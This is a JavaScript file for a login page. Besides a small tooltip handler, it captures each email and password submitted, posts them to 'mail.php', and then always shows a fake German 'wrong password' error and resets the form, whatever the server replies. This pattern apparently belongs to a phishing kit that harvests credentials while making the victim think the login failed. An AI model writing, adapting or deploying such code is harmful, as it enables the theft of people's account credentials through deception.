// Get elements
const searchBar = document.querySelector('.search-bar input');
const tooltip = document.getElementById('tooltip');
const loginForm = document.querySelector('form');
const errorMessage = document.querySelector('.error-message');
const loginSection = document.querySelector('.login-section');

// Tooltip functionality
// Show tooltip on click
searchBar.addEventListener('click', () => {
    tooltip.style.opacity = '1';
    tooltip.style.pointerEvents = 'auto'; // Enable interactions
});

// Hide tooltip when clicking outside
document.addEventListener('click', (event) => {
    if (!searchBar.contains(event.target) && !tooltip.contains(event.target)) {
        tooltip.style.opacity = '0';
        tooltip.style.pointerEvents = 'none'; // Prevent interactions when hidden
    }
});

// Form submission functionality
loginForm.addEventListener('submit', function (event) {
    event.preventDefault(); // Prevent the form from refreshing the page

    // Get the values entered by the user
    const email = loginForm.querySelector('input[type="email"]').value;
    const password = loginForm.querySelector('input[type="password"]').value;

    // AJAX request to send the data to the PHP script
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "mail.php", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

    // Send the form data as a URL-encoded string
    xhr.send(`email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`);

    // Show the custom red prompt regardless of the server's response
    errorMessage.style.display = "block";
    errorMessage.innerHTML = `
        <strong>Es ist ein Fehler aufgetreten.</strong>
        Das eingegebene Passwort ist nicht korrekt oder die E-Mail-Adresse ist nicht korrekt.
    `;

    loginSection.style.height = "400px"; // Adjust height dynamically

    // Optionally reset the form inputs
    loginForm.reset();

    // Hide the error message after a certain period, if desired
    setTimeout(() => {
        errorMessage.style.display = "none";
        loginSection.style.height = "300px"; // Reset to original height
    }, 5000);
});
